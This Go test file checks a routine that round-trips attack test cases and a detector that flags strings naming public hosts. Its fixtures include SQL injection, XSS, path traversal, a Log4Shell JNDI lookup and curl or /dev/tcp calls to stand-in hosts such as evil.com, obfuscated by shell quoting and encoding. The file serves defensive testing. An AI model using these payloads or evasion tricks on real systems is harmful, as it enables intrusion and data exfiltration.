package cases

import (
	"bytes"
	"reflect"
	"testing"
)

func TestLinesRoundTrip(t *testing.T) {
	t.Parallel()
	binary := line()
	binary.Source, binary.SourceCaseID = "b", "b-1"
	binary.PayloadBase64 = "/wA=" // not valid UTF-8
	binary.BodyBase64 = "gA=="
	binary.Placement, binary.Encoder = "body", "plain"

	textual := line()
	textual.Payload, textual.Placement = "1' OR '1'='1", "query"
	other := textual
	other.Source, other.SourceCaseID, other.Payload = "c", "c-9", "OR 1=1"
	headers := line()
	headers.SourceCaseID = "a-2"
	headers.Headers = map[string]string{"X-Note": "v"}
	headers.ContentType = "text/plain"
	headers.Body = "plain body"
	bare := line()
	bare.SourceCaseID = "a-3"
	bare.Query = nil
	bare.RawQuery = "a=%ZZ&b"

	var all []Case
	for _, l := range []Line{binary, textual, other, headers, bare} {
		all = append(all, mustCase(t, l))
	}
	merged, conflicts := Merge(all)
	if len(conflicts) != 0 || len(merged) != 4 {
		t.Fatalf("fixture: %d merged, %d conflicts", len(merged), len(conflicts))
	}
	for _, c := range merged {
		ls := Lines(c)
		want := max(len(c.Payloads), 1) * len(c.Sources)
		if len(ls) != want {
			t.Errorf("case %s: %d lines, want %d", c.ID[:8], len(ls), want)
		}
		var buf bytes.Buffer
		if err := WriteLines(&buf, ls); err != nil {
			t.Fatalf("case %s: WriteLines: %v", c.ID[:8], err)
		}
		read, err := ReadLines(&buf)
		if err != nil {
			t.Fatal(err)
		}
		var back []Case
		for _, l := range read {
			back = append(back, mustCase(t, l))
		}
		again, conflicts := Merge(back)
		if len(conflicts) != 0 || len(again) != 1 {
			t.Fatalf("case %s: re-merged into %d cases, %d conflicts", c.ID[:8], len(again), len(conflicts))
		}
		if !reflect.DeepEqual(again[0], c) {
			t.Errorf("case %s does not round-trip:\n got %+v\nwant %+v", c.ID[:8], again[0], c)
		}
	}
}

func TestNamesPublicHost(t *testing.T) {
	t.Parallel()
	public := []string{
		"curl abc.oastify.com",
		"/dev/tcp/198.51.100.7/80",
		"ping 8.8.8.8",
		"ping 8.8.8.8:53",
		"www.google.com",
		"WWW.GOOGLE.COM.",
		"mail root@mail.example.org now",
		"[2001:db8::1]",
		"host 2001:db8::1 here",
		"http://evil.com/",
		"${jndi:ldap://evil.com/a}",
		"%77%77%77%2egoogle%2ecom",
		"www&period;google&period;com",
		"ｗｗｗ．ｇｏｏｇｌｅ．ｃｏｍ",
		"${lower:e}vil.com",
		"nslookup bücher.example",
		"ping 0x08080808",
		// Short IPv4 forms inet_aton reads.
		"ping 1.1",
		"ping 9.9",
		"ping 2.25",
		"ping 2.2.2",
		"ping 8.8.2056",
		"ping 8.526344",
		"ping 1.16843009",
		"ping 1.0x10101",
		"ping -c1 1.1",
		"price 1.5 or 2.25",
		"ping 169.254''.1.1",
		// Hosts split by shell quoting and escaping.
		"curl evil''.com",
		"curl 'evil'.com",
		`curl evil\.com`,
		`curl evil"".com`,
		"curl evil'.'com",
		`curl evil"."com`,
		"curl evil${x}.com",
		"curl evil$x.com",
		"curl evil$@.com",
		"curl evil$*.com",
		"curl evil``.com",
		"curl evil$().com",
		"curl `echo evil`.com",
		"curl ev^il.com",
		"curl $'evil'.com",
		"curl evil\\\n.com",
		"nslookup evil''.com",
		"ping 8''.8.8.8",
		"ping 1.1.1''.1",
		"curl evil%27%27.com",
		"curl ev%5Cil.com",
		"curl ${x:-e}vil.com",
		"ping${IFS}8''.8.8.8",
		"curl evil$1.com",
		"curl %22evil%22%2E%22com%22",
	}
	for _, s := range public {
		if !NamesPublicHost(s) {
			t.Errorf("NamesPublicHost(%q) = false, want true", s)
		}
	}
	local := []string{
		"",
		"1' OR '1'='1",
		"<script>alert(1)</script>",
		"../../etc/passwd",
		"${jndi:ldap://callback.invalid/a}",
		"http://127.0.0.1/",
		"ping 127.0.0.1",
		"ping 10.0.0.1",
		"[::1]",
		"listen on ::",
		"std::cout",
		"ping localhost",
		"waf.example.test",
		"cat /etc/hosts.conf",
		"see index.html",
		"arr[1]",
		"version 10.2",
		// Short forms that read as local addresses only.
		"ping 10.1",
		"ping 127.1",
		"ping 192.168.1",
		"ping 0.0",
		// Shell quoting around local hosts.
		"curl 'callback'.invalid",
		"curl waf''.example.test",
		"curl printer''.local",
		// A split whose parts also read as local addresses. (A split that
		// leaves a part like 169.254, itself a public short form, is
		// refused.)
		"ping 10.0.0''.1",
		"ping 169.254.1''.1",
		"ping 192.168.1''.1",
		"${jndi:ldap://callback.invalid/a}",
		"${jndi:ldap://${x}callback.invalid/a}",
		`echo '${x}' "$@"`,
	}
	for _, s := range local {
		if NamesPublicHost(s) {
			t.Errorf("NamesPublicHost(%q) = true, want false", s)
		}
	}
}

func TestNamesPublicHostTruncatedShellSyntax(t *testing.T) {
	t.Parallel()
	for _, s := range []string{"$", "\\", "${", "${a", "${a:", "${a:-", "${a-b", "${}", "$(", "a$", "a\\", "${a}}", "${a:-}"} {
		NamesPublicHost(s) // must not panic
		NamesPublicHost("x " + s + " y")
	}
}
